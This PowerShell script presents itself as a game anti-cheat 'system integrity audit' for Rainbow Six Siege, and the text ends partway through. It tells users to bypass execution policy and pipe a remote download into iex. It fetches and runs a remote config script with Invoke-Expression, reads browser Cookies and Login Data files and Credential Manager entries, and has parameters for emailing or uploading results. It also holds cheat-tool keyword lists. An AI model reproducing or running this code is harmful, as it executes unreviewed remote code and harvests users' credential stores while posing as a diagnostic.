#Requires -RunAsAdministrator
# =============================================================================
#  SYSTEM INTEGRITY AUDIT SCRIPT v6.2
#  Enhanced Forensics Suite with AI Bot Detection & R6S Stats Integration
#  Repo: https://github.com/developer-for-all-games/SystemAudit
#  Bypass command (REQUIRED) : Set-ExecutionPolicy Bypass -Scope Process -Force;
#  Run: irm "https://raw.githubusercontent.com/developer-for-all-games/SystemAudit/main/SystemAudit.ps1" | iex
# =============================================================================

param(
    [string]$OutputPath = "C:\SystemAudit",
    [switch]$Silent,
    [string]$EmailTo = $null,
    [string]$EmailFrom = $null,
    [string]$EmailPassword = $null,
    [string]$SMTPServer = "smtp.gmail.com",
    [int]$SMTPPort = 587,
    [string]$GamePaths = $null,
    [switch]$ZipResults,
    [string]$UploadURL = $null,
    [switch]$NoEmail
)

# ========== CONFIG LOADER ==========
$configUrl = "https://raw.githubusercontent.com/developer-for-all-games/SystemAudit/main/config.ps1"
try {
    $configScript = irm $configUrl -ErrorAction Stop
    Invoke-Expression $configScript
    $config = $script:AuditConfig

    if (-not $EmailTo -and $config.EmailTo) { $EmailTo = $config.EmailTo }
    if (-not $EmailFrom -and $config.EmailFrom) { $EmailFrom = $config.EmailFrom }
    if (-not $EmailPassword -and $config.EmailPassword) { $EmailPassword = $config.EmailPassword }
    if (-not $SMTPServer -and $config.SMTPServer) { $SMTPServer = $config.SMTPServer }
    if ($config.SMTPPort) { $SMTPPort = $config.SMTPPort }
    if (-not $PSBoundParameters.ContainsKey('ZipResults') -and $config.ZipResults) { $ZipResults = $config.ZipResults }
    if ($OutputPath -eq "C:\SystemAudit" -and $config.OutputPath) { $OutputPath = $config.OutputPath }
} catch {
    Write-Warning "Could not load config from GitHub. Using defaults."
}

# ========== SETUP ==========
New-Item -ItemType Directory -Path $OutputPath -Force -ErrorAction SilentlyContinue | Out-Null
$Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$LogFile = "$OutputPath\Audit_$Timestamp.txt"
$CsvFolder = "$OutputPath\CSVs_$Timestamp"
$PrefetchFolder = "$OutputPath\PrefetchAnalysis_$Timestamp"
New-Item -ItemType Directory -Path $CsvFolder -Force -ErrorAction SilentlyContinue | Out-Null
New-Item -ItemType Directory -Path $PrefetchFolder -Force -ErrorAction SilentlyContinue | Out-Null

# ========== LOGGING FUNCTIONS ==========
function Write-Log {
    param([string]$Header, [object]$Data, [string]$CsvName = $null)
    $sep = "=" * 80
    Add-Content -Path $LogFile -Value "`n`n$sep`n  >> $Header`n$sep" -ErrorAction SilentlyContinue
    if ($Data) {
        Add-Content -Path $LogFile -Value ($Data | Out-String) -ErrorAction SilentlyContinue
        if ($CsvName) {
            $Data | Export-Csv -Path "$CsvFolder\$CsvName.csv" -NoTypeInformation -Force -ErrorAction SilentlyContinue
        }
    } else {
        Add-Content -Path $LogFile -Value "[No data found]" -ErrorAction SilentlyContinue
    }
}

function Write-Section {
    param([string]$Title)
    Add-Content -Path $LogFile -Value "`n---------------------------------------------------------------------`n  SECTION: $Title`n---------------------------------------------------------------------" -ErrorAction SilentlyContinue
}

function Write-Alert {
    param([string]$Message)
    Add-Content -Path $LogFile -Value "`n!!! ALERT: $Message" -ErrorAction SilentlyContinue
}

function Write-Warn {
    param([string]$Message)
    Add-Content -Path $LogFile -Value "`nWARNING: $Message" -ErrorAction SilentlyContinue
}

# ========== R6S STATS LOOKUP FUNCTIONS ==========
function Get-R6SPlayerStats {
    param([string]$Username)

    $results = @()
    $platforms = @("pc", "xboxone", "ps4")

    foreach ($plat in $platforms) {
        $statsFound = $false

        # Try r6.tracker.network API (most reliable)
        try {
            $url = "https://api.tracker.gg/api/v2/r6siege/standard/profile/$plat/$Username"
            $response = Invoke-RestMethod -Uri $url -Method Get -TimeoutSec 10 -ErrorAction Stop

            if ($response.data -and $response.data.segments) {
                $overview = $response.data.segments | Where-Object { $_.type -eq "overview" } | Select-Object -First 1
                $ranked = $response.data.segments | Where-Object { $_.type -eq "ranked" } | Select-Object -First 1

                if ($overview) {
                    $stats = [PSCustomObject]@{
                        Username        = $Username
                        Platform        = $plat
                        Level           = if ($overview.stats.level.value) { $overview.stats.level.value } else { "N/A" }
                        Rank            = if ($ranked.stats.rankLevel.metadata.name) { $ranked.stats.rankLevel.metadata.name } else { "N/A" }
                        MMR             = if ($ranked.stats.rating.value) { $ranked.stats.rating.value } else { "N/A" }
                        Kills           = if ($overview.stats.kills.value) { $overview.stats.kills.value } else { "N/A" }
                        Deaths          = if ($overview.stats.deaths.value) { $overview.stats.deaths.value } else { "N/A" }
                        KD              = if ($overview.stats.kd.value) { [math]::Round($overview.stats.kd.value, 2) } else { "N/A" }
                        Wins            = if ($overview.stats.wins.value) { $overview.stats.wins.value } else { "N/A" }
                        Losses          = if ($overview.stats.losses.value) { $overview.stats.losses.value } else { "N/A" }
                        WinRate         = if ($overview.stats.wlPercentage.value) { "$([math]::Round($overview.stats.wlPercentage.value, 1))%" } else { "N/A" }
                        Headshots       = if ($overview.stats.headshots.value) { $overview.stats.headshots.value } else { "N/A" }
                        TimePlayed      = if ($overview.stats.timePlayed.value) { $overview.stats.timePlayed.displayValue } else { "N/A" }
                        ProfileURL      = "https://r6.tracker.network/profile/$plat/$Username"
                        API_Status      = "Success (Tracker)"
                        LastUpdated     = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                    }
                    $results += $stats
                    $statsFound = $true
                }
            }
        } catch {
            # Try stats.cc API as fallback
            try {
                $url2 = "https://stats.cc/api/r6s/player/$plat/$Username"
                $response2 = Invoke-RestMethod -Uri $url2 -Method Get -TimeoutSec 10 -ErrorAction Stop

                if ($response2 -and $response2.data) {
                    $d = $response2.data
                    $stats = [PSCustomObject]@{
                        Username        = $Username
                        Platform        = $plat
                        Level           = if ($d.level) { $d.level } else { "N/A" }
                        Rank            = if ($d.rank) { $d.rank } else { "N/A" }
                        MMR             = if ($d.mmr) { $d.mmr } else { "N/A" }
                        Kills           = if ($d.kills) { $d.kills } else { "N/A" }
                        Deaths          = if ($d.deaths) { $d.deaths } else { "N/A" }
                        KD              = if ($d.kd) { $d.kd } else { "N/A" }
                        Wins            = if ($d.wins) { $d.wins } else { "N/A" }
                        Losses          = if ($d.losses) { $d.losses } else { "N/A" }
                        WinRate         = if ($d.winRate) { $d.winRate } else { "N/A" }
                        Headshots       = if ($d.headshots) { $d.headshots } else { "N/A" }
                        TimePlayed      = if ($d.timePlayed) { $d.timePlayed } else { "N/A" }
                        ProfileURL      = "https://stats.cc/player/$plat/$Username"
                        API_Status      = "Success (stats.cc)"
                        LastUpdated     = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                    }
                    $results += $stats
                    $statsFound = $true
                }
            } catch {
                # Try Ubisoft stats API as last resort
                try {
                    $url3 = "https://public-ubiservices.ubi.com/v3/profiles?nameOnPlatform=$Username&platformType=$plat"
                    # This requires auth, so it will likely fail but worth trying
                } catch {
                    # Silently continue
                }
            }
        }

        if ($statsFound) { break }  # If found on one platform, don't check others for same account
    }

    return $results
}

function Find-R6SAccounts {
    $accounts = @()

    # Method 1: Check R6S save data / config files for usernames
    $r6sPaths = @(
        "$env:USERPROFILE\Documents\My Games\Rainbow Six - Siege",
        "$env:LOCALAPPDATA\Ubisoft Game Launcher\savegames",
        "$env:LOCALAPPDATA\Ubisoft Game Launcher\logs",
        "$env:LOCALAPPDATA\Ubisoft Game Launcher\settings.yml",
        "$env:APPDATA\Ubisoft Game Launcher\settings.yml",
        "C:\Program Files (x86)\Ubisoft\Ubisoft Game Launcher\cache",
        "C:\Program Files\Ubisoft\Ubisoft Game Launcher\cache"
    )

    foreach ($path in $r6sPaths) {
        if (Test-Path $path) {
            try {
                $files = Get-ChildItem $path -Recurse -File -ErrorAction SilentlyContinue | 
                    Where-Object { $_.Extension -in '.ini','.cfg','.yml','.yaml','.json','.txt','.log','.dat' }

                foreach ($file in $files) {
                    try {
                        $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
                        if ($content) {
                            $matches = [regex]::Matches($content, '(?i)(?:username|name|nickname|player|displayname)["\s]*[=:]["\s]*([^"\s\r\n]{3,32})')
                            foreach ($match in $matches) {
                                $uname = $match.Groups[1].Value.Trim()
                                if ($uname -and $uname -notmatch '^(true|false|null|none|default|user|admin|test)$' -and $uname.Length -ge 3) {
                                    if ($accounts -notcontains $uname) {
                                        $accounts += $uname
                                    }
                                }
                            }

                            $rawMatches = [regex]::Matches($content, '(?i)\b([a-zA-Z][a-zA-Z0-9_.-]{2,31})\b')
                            foreach ($match in $rawMatches) {
                                $uname = $match.Groups[1].Value.Trim()
                                if ($uname -and $uname -notmatch '^(true|false|null|none|default|user|admin|test|windows|system|program|files|common|appdata|local|roaming)$') {
                                    if ($accounts -notcontains $uname) {
                                        $accounts += $uname
                                    }
                                }
                            }
                        }
                    } catch {}
                }
            } catch {}
        }
    }

    # Method 2: Check Ubisoft Connect registry for usernames
    $ubiRegPaths = @(
        "HKCU:\SOFTWARE\Ubisoft\Ubisoft Game Launcher",
        "HKLM:\SOFTWARE\Ubisoft\Ubisoft Game Launcher",
        "HKLM:\SOFTWARE\WOW6432Node\Ubisoft\Ubisoft Game Launcher"
    )

    foreach ($regPath in $ubiRegPaths) {
        if (Test-Path $regPath) {
            try {
                $props = Get-ItemProperty $regPath -ErrorAction SilentlyContinue
                $propNames = $props.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' } | Select-Object -ExpandProperty Name
                foreach ($propName in $propNames) {
                    $val = $props.$propName
                    if ($val -and $val -is [string] -and $val.Length -ge 3 -and $val.Length -le 32 -and $val -notmatch '\\|/|:|\*|\?|"|<|>|\|') {
                        if ($accounts -notcontains $val) {
                            $accounts += $val
                        }
                    }
                }
            } catch {}
        }
    }

    # Method 3: Check browser history/cookies for Ubisoft Connect logins
    $browserPaths = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
        "$env:APPDATA\Mozilla\Firefox\Profiles",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    )

    foreach ($bPath in $browserPaths) {
        if (Test-Path $bPath) {
            try {
                $files = Get-ChildItem $bPath -Recurse -File -ErrorAction SilentlyContinue | 
                    Where-Object { $_.Name -in ('Cookies','Login Data','History','places.sqlite') }
                foreach ($file in $files) {
                    try {
                        $content = [System.IO.File]::ReadAllText($file.FullName, [System.Text.Encoding]::UTF8)
                        $ubiMatches = [regex]::Matches($content, '(?i)ubisoft|uplay|connect.*?(?:username|name|email|login).*?([a-zA-Z0-9_.-]{3,32})')
                        foreach ($match in $ubiMatches) {
                            $uname = $match.Groups[1].Value.Trim()
                            if ($uname -and $accounts -notcontains $uname) {
                                $accounts += $uname
                            }
                        }
                    } catch {}
                }
            } catch {}
        }
    }

    # Method 4: Check Windows Credential Manager for Ubisoft credentials
    try {
        $creds = cmd /c "cmdkey /list" 2>$null
        $credMatches = [regex]::Matches($creds, '(?i)ubisoft|uplay|connect')
        foreach ($match in $credMatches) {
            $line = $creds.Substring([Math]::Max(0, $match.Index - 100), [Math]::Min(200, $creds.Length - [Math]::Max(0, $match.Index - 100)))
            $unameMatch = [regex]::Match($line, 'User:\s*([a-zA-Z0-9_.@-]{3,32})')
            if ($unameMatch.Success) {
                $uname = $unameMatch.Groups[1].Value.Trim()
                if ($uname -and $accounts -notcontains $uname) {
                    $accounts += $uname
                }
            }
        }
    } catch {}

    # Method 5: Check common R6S screenshot/video folders for usernames in filenames
    $mediaPaths = @(
        "$env:USERPROFILE\Videos\Rainbow Six - Siege",
        "$env:USERPROFILE\Pictures\Rainbow Six - Siege",
        "$env:USERPROFILE\Videos\Ubisoft",
        "$env:USERPROFILE\Pictures\Ubisoft"
    )

    foreach ($mPath in $mediaPaths) {
        if (Test-Path $mPath) {
            try {
                $files = Get-ChildItem $mPath -Recurse -File -ErrorAction SilentlyContinue
                foreach ($file in $files) {
                    $name = $file.BaseName
                    $nameMatches = [regex]::Matches($name, '([a-zA-Z][a-zA-Z0-9_.-]{2,31})')
                    foreach ($match in $nameMatches) {
                        $uname = $match.Groups[1].Value.Trim()
                        if ($uname -and $uname -notmatch '^(screenshot|video|clip|record|image|temp|tmp|default|untitled)$') {
                            if ($accounts -notcontains $uname) {
                                $accounts += $uname
                            }
                        }
                    }
                }
            } catch {}
        }
    }

    # Method 6: Check Discord cache for R6S-related usernames
    $discordPaths = @(
        "$env:APPDATA\Discord\Cache",
        "$env:LOCALAPPDATA\Discord\Cache"
    )

    foreach ($dPath in $discordPaths) {
        if (Test-Path $dPath) {
            try {
                $files = Get-ChildItem $dPath -File -ErrorAction SilentlyContinue | Select-Object -First 50
                foreach ($file in $files) {
                    try {
                        $content = [System.IO.File]::ReadAllText($file.FullName, [System.Text.Encoding]::UTF8)
                        $r6Matches = [regex]::Matches($content, '(?i)rainbow|siege|r6s|ubisoft')
                        if ($r6Matches.Count -gt 0) {
                            $unameMatches = [regex]::Matches($content, '"name"\s*:\s*"([a-zA-Z][a-zA-Z0-9_.-]{2,31})"')
                            foreach ($match in $unameMatches) {
                                $uname = $match.Groups[1].Value.Trim()
                                if ($uname -and $accounts -notcontains $uname) {
                                    $accounts += $uname
                                }
                            }
                        }
                    } catch {}
                }
            } catch {}
        }
    }

    # Method 7: Check for R6S-related files in Downloads
    $dlPath = "$env:USERPROFILE\Downloads"
    if (Test-Path $dlPath) {
        try {
            $files = Get-ChildItem $dlPath -File -ErrorAction SilentlyContinue | 
                Where-Object { $_.Name -match 'r6s|rainbow|siege|ubisoft|uplay' }
            foreach ($file in $files) {
                $nameMatches = [regex]::Matches($file.BaseName, '([a-zA-Z][a-zA-Z0-9_.-]{2,31})')
                foreach ($match in $nameMatches) {
                    $uname = $match.Groups[1].Value.Trim()
                    if ($uname -and $uname -notmatch '^(download|file|document|image|temp|tmp)$') {
                        if ($accounts -notcontains $uname) {
                            $accounts += $uname
                        }
                    }
                }
            }
        } catch {}
    }

    # Filter and clean up found accounts
    $filtered = $accounts | Where-Object { 
        $_ -and 
        $_.Length -ge 3 -and 
        $_.Length -le 32 -and 
        $_ -notmatch '^(true|false|null|none|default|user|admin|test|windows|system|program|files|common|appdata|local|roaming|users|public|defaultuser|desktop|documents|downloads|videos|pictures|music)$' -and
        $_ -notmatch '^(ini|cfg|yml|yaml|json|txt|log|dat|exe|dll|sys|bat|cmd|ps1)$' -and
        $_ -notmatch '^(cache|config|settings|data|save|profile|account|login)$'
    } | Sort-Object -Unique

    return $filtered
}

# ========== HEADER ==========
$headerText = @"
================================================================================
  SYSTEM INTEGRITY AUDIT REPORT v6.2
================================================================================
  Generated:  $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
  Computer:  $env:COMPUTERNAME
  User:      $env:USERNAME
  Admin:     $([bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544'))
================================================================================
"@
Add-Content -Path $LogFile -Value $headerText -ErrorAction SilentlyContinue

# ========== SECTION 1: SYSTEM INFO ==========
Write-Section "1: SYSTEM INFORMATION & WINDOWS INSTALL DATE"

$winVer = [System.Environment]::OSVersion.Version
$isWin11 = $winVer.Build -ge 22000
$osName = if ($isWin11) { "Windows 11" } else { "Windows 10" }

Write-Log "OPERATING SYSTEM" "Detected: $osName (Build $($winVer.Build))"

try {
    $os = Get-CimInstance Win32_OperatingSystem -ErrorAction Stop
    $installDate = $os.InstallDate
    $uptime = (Get-Date) - $os.LastBootUpTime
    $daysSinceInstall = [math]::Round(((Get-Date) - $installDate).TotalDays, 0)
    $uptimeStr = "$($uptime.Days)d $($uptime.Hours)h $($uptime.Minutes)m"

    $osInfo = [PSCustomObject]@{
        "OS Name" = $os.Caption
        "Version" = $os.Version
        "Build" = $os.BuildNumber
        "Architecture" = $os.OSArchitecture
        "Install Date" = $installDate.ToString("yyyy-MM-dd HH:mm:ss")
        "Days Since Install" = $daysSinceInstall
        "Last Boot" = $os.LastBootUpTime.ToString("yyyy-MM-dd HH:mm:ss")
        "System Uptime" = $uptimeStr
        "Serial Number" = $os.SerialNumber
        "Total RAM GB" = [math]::Round($os.TotalVisibleMemorySize / 1MB, 2)
        "Free RAM GB" = [math]::Round($os.FreePhysicalMemory / 1MB, 2)
    }
    Write-Log "WINDOWS INSTALL DATE & SYSTEM DETAILS" $osInfo "OS_Info"
} catch {
    Write-Warn "Could not retrieve full system information"
    Write-Log "SYSTEM INFO (LIMITED)" "Error: $($_.Exception.Message)"
}

# ========== SECTION 2: HARDWARE ==========
Write-Section "2: HARDWARE & BIOS"

try { $bios = Get-CimInstance Win32_BIOS -ErrorAction Stop | Select-Object Manufacturer, Name, SerialNumber, Version } catch { $bios = Get-WmiObject Win32_BIOS -ErrorAction SilentlyContinue | Select-Object Manufacturer, Name, SerialNumber, Version }
Write-Log "BIOS" $bios "BIOS_Info"

try { $mobo = Get-CimInstance Win32_BaseBoard -ErrorAction Stop | Select-Object Manufacturer, Product, SerialNumber, Version } catch { $mobo = Get-WmiObject Win32_BaseBoard -ErrorAction SilentlyContinue | Select-Object Manufacturer, Product, SerialNumber, Version }
Write-Log "MOTHERBOARD" $mobo "Motherboard"

try { $cpu = Get-CimInstance Win32_Processor -ErrorAction Stop | Select-Object Name, Manufacturer, NumberOfCores, NumberOfLogicalProcessors, @{N='MaxClockGHz';E={[math]::Round($_.MaxClockSpeed/1000,2)}} } catch { $cpu = Get-WmiObject Win32_Processor -ErrorAction SilentlyContinue | Select-Object Name, Manufacturer, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed }
Write-Log "CPU" $cpu "CPU"

try { $gpu = Get-CimInstance Win32_VideoController -ErrorAction Stop | Select-Object Name, @{N='VRAM_GB';E={[math]::Round($_.AdapterRAM/1GB,2)}}, DriverVersion, @{N='Resolution';E={$_.VideoModeDescription}} } catch { $gpu = Get-WmiObject Win32_VideoController -ErrorAction SilentlyContinue | Select-Object Name, AdapterRAM, DriverVersion, VideoModeDescription }
Write-Log "GPU" $gpu "GPU"

# ========== SECTION 3: CONNECTED DEVICES ==========
Write-Section "3: CONNECTED DEVICES - DEEP SCAN"

# USB
$pluggedUSB = @()
try { $pluggedUSB = Get-PnpDevice -Class USB -ErrorAction Stop | Where-Object { $_.Status -eq 'OK' } | Select-Object Name, InstanceId, @{N='Type';E={$_.Class}}, Status, @{N='Present';E={$_.Present}} } catch { $pluggedUSB = Get-WmiObject Win32_PnPEntity -ErrorAction SilentlyContinue | Where-Object { $_.PNPClass -eq 'USB' -and $_.Status -eq 'OK' } | Select-Object Name, DeviceID, @{N='Type';E={$_.PNPClass}}, Status }
Write-Log "USB DEVICES PLUGGED IN ($($pluggedUSB.Count))" $pluggedUSB "USB_Currently_Connected"

# HID
$hidDevices = @()
try { $hidDevices = Get-PnpDevice -Class HIDClass -ErrorAction Stop | Where-Object { $_.Status -eq 'OK' } | Select-Object Name, InstanceId, Status } catch { $hidDevices = Get-WmiObject Win32_PnPEntity -ErrorAction SilentlyContinue | Where-Object { $_.PNPClass -eq 'HIDClass' -and $_.Status -eq 'OK' } | Select-Object Name, DeviceID, Status }
Write-Log "HID DEVICES ($($hidDevices.Count))" $hidDevices "HID_Devices"

# Audio
$audioDevices = @()
try { $audioDevices = Get-PnpDevice -Class AudioEndpoint, MEDIA -ErrorAction Stop | Where-Object { $_.Status -eq 'OK' } | Select-Object Name, InstanceId, @{N='Class';E={$_.Class}}, Status } catch { $audioDevices = Get-WmiObject Win32_SoundDevice -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq 'OK' } | Select-Object Name, DeviceID, @{N='Class';E={'Audio'}}, Status }
Write-Log "AUDIO DEVICES ($($audioDevices.Count))" $audioDevices "Audio_Devices"

# PCIe/DMA
$pcieDevices = @()
try { $pcieDevices = Get-PnpDevice -ErrorAction Stop | Where-Object { $_.InstanceId -match 'PCI\\|PCIE\\' -or $_.Name -match 'DMA|Thunderbolt|PCIe' } | Select-Object Name, InstanceId, Status, @{N='Class';E={$_.Class}} } catch { $pcieDevices = Get-WmiObject Win32_PnPEntity -ErrorAction SilentlyContinue | Where-Object { $_.DeviceID -match 'PCI\\' -or $_.Name -match 'DMA|Thunderbolt' } | Select-Object Name, DeviceID, Status, @{N='Class';E={$_.PNPClass}} }
if ($pcieDevices.Count -gt 0) { Write-Alert "PCIe/DMA devices detected - review carefully!" }
Write-Log "PCIe/DMA/THUNDERBOLT ($($pcieDevices.Count))" $pcieDevices "PCIe_DMA_Devices"

# Storage
$storage = @()
try { $storage = Get-CimInstance Win32_DiskDrive -ErrorAction Stop | Select-Object Model, @{N='Size_GB';E={[math]::Round($_.Size/1GB,2)}}, InterfaceType, MediaType, SerialNumber, Partitions } catch { $storage = Get-WmiObject Win32_DiskDrive -ErrorAction SilentlyContinue | Select-Object Model, Size, InterfaceType, MediaType, SerialNumber, Partitions }
Write-Log "STORAGE DRIVES ($($storage.Count))" $storage "Storage_Drives"

# Network
$netAdapters = @()
try { $netAdapters = Get-NetAdapter -ErrorAction Stop | Where-Object { $_.Status -eq 'Up' } | Select-Object Name, InterfaceDescription, MacAddress, LinkSpeed, MediaConnectionState } catch { $netAdapters = Get-WmiObject Win32_NetworkAdapter -ErrorAction SilentlyContinue | Where-Object { $_.NetConnectionStatus -eq 2 } | Select-Object Name, @{N='InterfaceDescription';E={$_.Description}}, MacAddress, @{N='LinkSpeed';E={$_.Speed}}, @{N='MediaConnectionState';E={'Connected'}} }
Write-Log "NETWORK ADAPTERS ($($netAdapters.Count))" $netAdapters "Network_Adapters"

# Bluetooth
$bluetooth = @()
try { $bluetooth = Get-PnpDevice -Class Bluetooth -ErrorAction Stop | Where-Object { $_.Status -eq 'OK' } | Select-Object Name, InstanceId, Status } catch { try { $bluetooth = Get-WmiObject Win32_PnPEntity -ErrorAction SilentlyContinue | Where-Object { $_.PNPClass -eq 'Bluetooth' -and $_.Status -eq 'OK' } | Select-Object Name, DeviceID, Status } catch { $bluetooth = @([PSCustomObject]@{Note="No Bluetooth found"; Status="N/A"}) } }
Write-Log "BLUETOOTH ($($bluetooth.Count))" $bluetooth "Bluetooth"

# Thunderbolt
$thunderbolt = @()
try { $thunderbolt = Get-PnpDevice -ErrorAction Stop | Where-Object { $_.Name -match 'Thunderbolt|TBT' -or $_.InstanceId -match 'TBT' } | Select-Object Name, InstanceId, Status, @{N='Class';E={$_.Class}} } catch { $thunderbolt = @([PSCustomObject]@{Note="No Thunderbolt detected"}) }
Write-Log "THUNDERBOLT ($($thunderbolt.Count))" $thunderbolt "Thunderbolt"

# Serial/COM
$serialPorts = @()
try { $serialPorts = Get-PnpDevice -Class Ports -ErrorAction Stop | Where-Object { $_.Status -eq 'OK' } | Select-Object Name, InstanceId, Status; if (-not $serialPorts) { $serialPorts = Get-WmiObject Win32_SerialPort -ErrorAction SilentlyContinue | Select-Object Name, DeviceID, Description } } catch { $serialPorts = Get-WmiObject Win32_SerialPort -ErrorAction SilentlyContinue | Select-Object Name, DeviceID, Description }
Write-Log "SERIAL/COM PORTS ($($serialPorts.Count))" $serialPorts "Serial_Ports"

# All PNP
$allPnp = @()
try { $allPnp = Get-PnpDevice -ErrorAction Stop | Where-Object { $_.Status -eq 'OK' -and $_.Present -eq $true } | Select-Object Name, InstanceId, @{N='Class';E={$_.Class}}, Status, @{N='Present';E={$_.Present}} } catch { $allPnp = Get-WmiObject Win32_PnPEntity -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq 'OK' } | Select-Object Name, DeviceID, @{N='Class';E={$_.PNPClass}}, Status }
Write-Log "ALL PNP DEVICES ($($allPnp.Count))" $allPnp "All_PnP_Devices"

# ========== SECTION 4: MONITORS ==========
Write-Section "4: DISPLAY DEVICES"

$monitors = @()
try {
    $monitors = Get-CimInstance WmiMonitorBasicDisplayParams -ErrorAction Stop | ForEach-Object {
        [PSCustomObject]@{ MonitorID = ($_.InstanceName -split '\\')[1]; SupportedDisplayModes = $_.SupportedDisplayModes; NativeResolution = if ($_.NativeResolution) { "$($_.NativeResolution.X)x$($_.NativeResolution.Y)" } else { "N/A" }; DetectionMethod = "WMI-CIM" }
    }
} catch {
    try {
        $monitors = Get-WmiObject WmiMonitorBasicDisplayParams -ErrorAction Stop | ForEach-Object {
            [PSCustomObject]@{ MonitorID = $_.InstanceName; SupportedDisplayModes = "Check manually"; NativeResolution = "Check manually"; DetectionMethod = "WMI-Legacy" }
        }
    } catch {
        $monitorRegPath = "HKLM:\SYSTEM\CurrentControlSet\Enum\DISPLAY"
        if (Test-Path $monitorRegPath) {
            Get-ChildItem $monitorRegPath -ErrorAction SilentlyContinue | ForEach-Object {
                Get-ChildItem $_.PSPath -ErrorAction SilentlyContinue | ForEach-Object {
                    $props = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
                    if ($props) { $monitors += [PSCustomObject]@{ MonitorID = $_.PSChildName; FriendlyName = if ($props.FriendlyName) { $props.FriendlyName } else { "Unknown" }; DeviceDesc = if ($props.DeviceDesc) { $props.DeviceDesc } else { "N/A" }; Mfg = if ($props.Mfg) { $props.Mfg } else { "N/A" }; DetectionMethod = "Registry" } }
                }
            }
        }
        if ($monitors.Count -eq 0) { $monitors = @([PSCustomObject]@{ MonitorID = "Unavailable"; FriendlyName = "Monitor detection not supported"; DeviceDesc = "Use dxdiag or Display Settings"; Mfg = "N/A"; DetectionMethod = "None" }) }
    }
}
Write-Log "MONITORS ($($monitors.Count))" $monitors "Monitors"

# ========== SECTION 5: PREFETCH ==========
Write-Section "5: PREFETCH FORENSICS"

$prefetch = Get-ChildItem "C:\Windows\Prefetch" -Filter "*.pf" -ErrorAction SilentlyContinue | Select-Object Name, @{N='Executable';E={$_.BaseName -replace '-[A-F0-9]{8}$',''}}, LastWriteTime, LastAccessTime, CreationTime, @{N='SizeKB';E={[math]::Round($_.Length/1KB,2)}}, @{N='Hash';E={if ($_.BaseName -match '-([A-F0-9]{8})$') {$Matches[1]} else {'N/A'}}}, @{N='DaysSinceRun';E={[math]::Round(((Get-Date) - $_.LastWriteTime).TotalDays, 1)}}, @{N='RunCountEstimate';E={ $size = $_.Length; if ($size -lt 10000) { "Low (1-5x)" } elseif ($size -lt 50000) { "Medium (5-20x)" } else { "High (20x+)" } }}

Write-Log "ALL PREFETCH FILES ($($prefetch.Count))" $prefetch "Prefetch_All"
$prefetch | Export-Csv -Path "$PrefetchFolder\All_Prefetch.csv" -NoTypeInformation -Force
Add-Content -Path "$PrefetchFolder\Prefetch_Summary.txt" -Value "Total Prefetch Files: $($prefetch.Count)`nGenerated: $(Get-Date)"

# Timeline
$prefetchTimeline = $prefetch | Sort-Object LastWriteTime -Descending | Select-Object -First 50 | Select-Object Executable, LastWriteTime, DaysSinceRun, RunCountEstimate
Write-Log "PREFETCH TIMELINE (Last 50)" $prefetchTimeline "Prefetch_Timeline"

# Suspicious
$susNames = 'cheat','hack','inject','aim','bot','trigger','esp','wall','spoofer','bypass','loader','processhacker','cheatengine','artmoney','speedhack','dma','arduino','raspberry','pico','flipper','badusb','aimbot','wallhack','radar','macro','script','lua','trainer'
$susPrefetch = $prefetch | Where-Object { $e=$_.Executable.ToLower(); $susNames | ForEach-Object { if($e -like "*$_*"){return $true}}; if ($e -match '^[a-z0-9]{1,4}\.exe$') { return $true }; if ($e -match 'inject|loader|map|unmap|hook|detour|minhook|scylla|x64dbg|cheat|hack|trainer|aim|bot') { return $true }; return $false }
if ($susPrefetch.Count -gt 0) { Write-Alert "$($susPrefetch.Count) suspicious prefetch files detected!" }
Write-Log "SUSPICIOUS PREFETCH ($($susPrefetch.Count))" $susPrefetch "Prefetch_Suspicious"

# Weird names
$weirdPrefetch = $prefetch | Where-Object { $e = $_.Executable.ToLower(); if ($e -match '^[a-z]\.exe$') { return $true }; if ($e -match '^[a-z0-9]{2,4}\.exe$') { return $true }; if ($e -match '^[0-9a-f]{8}-') { return $true }; if ($e -match 'tmp|temp|rand|random') { return $true }; return $false }
if ($weirdPrefetch.Count -gt 0) { Write-Warn "$($weirdPrefetch.Count) weird prefetch names found!" }
Write-Log "WEIRD PREFETCH NAMES ($($weirdPrefetch.Count))" $weirdPrefetch "Prefetch_Weird"

# ========== SECTION 6: AI BOT DETECTION ==========
Write-Section "6: AI BOT, MACRO & AUTOMATION DETECTION"

$aiBotSignatures = @(
    'aimbot','triggerbot','espbot','radarbot','recoilbot','aimassist',
    'pixelbot','colorbot','imagebot','screenbot','memorybot',
    'autohotkey','ahk','macro','macrogamer','tinytask','mouse recorder',
    'keystroke recorder','input recorder','action recorder',
    'tensorflow','pytorch','onnx','opencv','yolo','darknet',
    'python.*bot','py.*aim','py.*cheat','pycheat','pybot',
    'synthetic','synthetix','interception','kmbox','km-box',
    'arduino leonardo','pro micro','usb rubber ducky','badusb',
    'dma card','pcileech','screamer','facedancer','greatfet',
    'tensorrt','cuda.*bot','gpu.*aim','nvidia.*cheat',
    'mouse_event','keybd_event','sendinput','interception driver',
    'private cheat','public cheat','unknowncheats','unknown cheat',
    'cheat engine','cheatengine','artmoney','speedhack','x64dbg',
    'ollydbg','ida pro','ghidra','reclass','reclass.net'
)

# Get processes FIRST before using them (FIXED: moved before AI Bot Processes section)
$procs = Get-Process | Select-Object Id, ProcessName, Path, Company, Product, ProductVersion, @{N='StartTime';E={$_.StartTime}}, @{N='MemoryMB';E={[math]::Round($_.WorkingSet64/1MB,2)}}, @{N='ParentPID';E={(Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)" -ErrorAction SilentlyContinue).ParentProcessId}}, @{N='CommandLine';E={(Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)" -ErrorAction SilentlyContinue).CommandLine}}

# Get scheduled tasks BEFORE using them (FIXED: moved before Auto Tasks section)
$tasks = @()
